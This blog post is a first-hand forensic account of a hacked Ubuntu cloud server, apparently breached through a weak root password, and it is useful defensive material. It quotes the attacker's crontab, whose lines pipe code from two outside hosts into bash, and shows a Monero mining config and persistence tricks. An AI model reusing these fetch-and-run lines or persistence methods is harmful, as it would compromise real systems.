+++
title = 'My Ubuntu server was hacked!'
date = 2023-07-15T04:36:12-05:00
draft = false
+++
## Problem

Root and other users, except the default Ubuntu user on Tencent Cloud, are unable to log in.

- Immediately logged into Ubuntu and confirmed the configuration in /etc/ssh/sshd_config. `PermitRootLogin` was enabled, and `PasswordAuthentication` was also active.
- Used `passwd` to reset the password.
- Still failed to log in.

CPU utilization at 100%.

![CPU Utilization](/images/cpu-util.png)

- Used `kill -9 2724` to terminate the process.
- Found implanted programs in /var/tmp/.x and /var/tmp/.xrx.

```bash
lighthouse@VM-12-14-ubuntu:~$ ls -la /var/tmp/.xrx /var/tmp/.x
/var/tmp/.x:
total 1032
drwxr-xr-x  2 root root    4096 Jul  8 03:32 .
drwxrwxrwt 10 root root    4096 Jul 11 12:44 ..
-rwxr-xr-x  1 root root 1047528 Mar 29 22:10 secure

/var/tmp/.xrx:
total 7144
drwxr-xr-x  2 root root    4096 Jul  8 03:32 .
drwxrwxrwt 10 root root    4096 Jul 11 12:44 ..
-rwxr-xr-x  1 root root   36464 Mar 29 22:10 chattr
-rwxr-xr-x  1 root root    4437 Mar 29 22:10 config.json
-rwxr-xr-x  1 root root 1045224 Mar 29 22:10 init.sh
-rwxr-xr-x  1 root root     388 Mar 29 22:10 key
-rwxr-xr-x  1 root root      63 Mar 29 22:10 scp
-rwxr-xr-x  1 root root 6202944 Mar 29 22:10 xrx
```

```bash
lighthouse@VM-12-14-ubuntu:~$ find /var/tmp/.xrx -type f -exec file {} \;
/var/tmp/.xrx/xrx: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), static-pie linked, stripped
/var/tmp/.xrx/scp: Bourne-Again shell script, ASCII text executable
/var/tmp/.xrx/config.json: JSON data
/var/tmp/.xrx/key: OpenSSH RSA public key
/var/tmp/.xrx/chattr: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
/var/tmp/.xrx/init.sh: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=81e40e2e8b4c74c7ab0f7549df7e9915d95e9a71, for GNU/Linux 3.2.0, not stripped
```

Opened config.json.

```json
{
            "algo": null,
            "coin": "monero",
            "url": "pool.supportxmr.com:443",
            "user": "4BDcc1fBZ26HAzPpYHKczqe95AKoURDM6EmnwbPfWBqJHgLEXaZSpQYM8pym2Jt8JJRNT5vjKHAU1B1mmCCJT9vJHaG2QRL",
            "pass": "x",
            "rig-id": "",
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
}
```

It's evident that it's being used for mining Monero.

## Possible Vulnerabilities

A friend set a very common password for the root user while logging into the server: `admin`. It was cracked after 790 brute-force attempts.

## Clues

1.The ssh's authorized_keys was tampered with.

```bash
lighthouse@VM-12-14-ubuntu:~$ sudo stat /root/.ssh/authorized_keys
  File: /root/.ssh/authorized_keys
  Size: 388             Blocks: 8          IO Block: 4096   regular file
Device: fc02h/64514d    Inode: 524314      Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2023-07-11 12:40:27.494946194 +0800
Modify: 2023-07-08 03:32:17.174803904 +0800
Change: 2023-07-08 03:32:17.178804015 +0800
 Birth: 2023-07-08 03:32:17.174803904 +0800
```

Checked /etc/ssh/sshd_config; it wasn't modified.

Public key encryption wasn't enabled.

```bash
lighthouse@VM-12-14-ubuntu:~$ grep Pubkey /etc/ssh/sshd_config 
#PubkeyAuthentication yes
PubkeyAcceptedKeyTypes +ssh-rsa
```

It's clear that authorized_keys and the implanted .xrx/key are the same.

```bash
lighthouse@VM-12-14-ubuntu:~$ sudo cmp --silent /var/tmp/.xrx/key /root/.ssh/authorized_keys && echo "identical" || echo "diff"
identical
```

1. Crontab running scheduled tasks.

```bash
lighthouse@VM-12-14-ubuntu:~$ cat /etc/crontab
@daily root /var/tmp/.x/secure >/dev/null 2>&1 & disown  
@reboot root /var/tmp/.xrx/init.sh hide >/dev/null 2>&1 & disown  
1 * * * * root /var/tmp/.x/secure >/dev/null 2>&1 & disown  
*/30 * * * * root curl 179.43.142.41:1011/next | bash 
*/30 * * * * root curl load.whitesnake.church:1011/next | bash
```

`@reboot` runs init.sh every reboot.

The modification time matches that of authorized_keys.

```bash
lighthouse@VM-12-14-ubuntu:~$ stat /etc/crontab
  File: /etc/crontab
  Size: 305             Blocks: 8          IO Block: 4096   regular file
Device: fc02h/64514d    Inode: 131742      Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2023-07-11 12:38:54.108000000 +0800
Modify: 2023-07-08 03:32:22.238945046 +0800
Change: 2023-07-08 03:32:22.238945046 +0800
 Birth: 2023-07-08 03:32:17.058800670 +0800
```

1. `passwd-` was modified.

```bash
lighthouse@VM-12-14-ubuntu:~$ ls -la /etc | grep passwd
-rw-r--r--   1 root root       2263 Jul  9 12:12 passwd
-rw-r--r--   1 root root       2218 Jul  8 03:32 passwd-
```

The password was set to `x`, stored in /etc/shadow.

Upon observation, all accounts except Ubuntu had identical salts and hash values. Even after using passwd to change the password, it didn't change, suggesting passwd was replaced.

```bash
lighthouse@VM-12-14-ubuntu:~$ stat /usr/bin/passwd
  File: /usr/bin/passwd
  Size: 59976           Blocks: 120        IO Block: 4096   regular file
Device: fc02h/64514d    Inode: 8266        Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2023-07-11 15:31:38.888999225 +0800
Modify: 2022-11-24 20:05:18.000000000 +0800
Change: 2023-07-11 15:31:37.292954793 +0800
 Birth: 2023-07-11 15:31:37.236953235 +0800
```

```bash
lighthouse@VM-12-14-ubuntu:~$ sudo debsums passwd
/sbin/shadowconfig                                                            OK
/usr/bin/chage                                                                OK
/usr/bin/chfn                                                                 OK
/usr/bin/chsh                                                                 OK
/usr/bin/expiry                                                               OK
/usr/bin/gpasswd                                                              OK
/usr/bin/passwd                                                           FAILED
/usr/lib/tmpfiles.d/passwd.conf                                               OK
```

It appears that the passwd command has been replaced and is unable to change passwords normally. This is why after 'changing the password,' both root and most other users are unable to log in.

Now to replace passwd: `sudo apt-get install --reinstall passwd`

Then use `sudo debsums passwd` to verify again, and this time it's correct.

Now change the root password and try to SSH login, success!

## Finally

To completely eradicate the problem and prevent system backdoors, the only solution is to reinstall the operating system on the server.
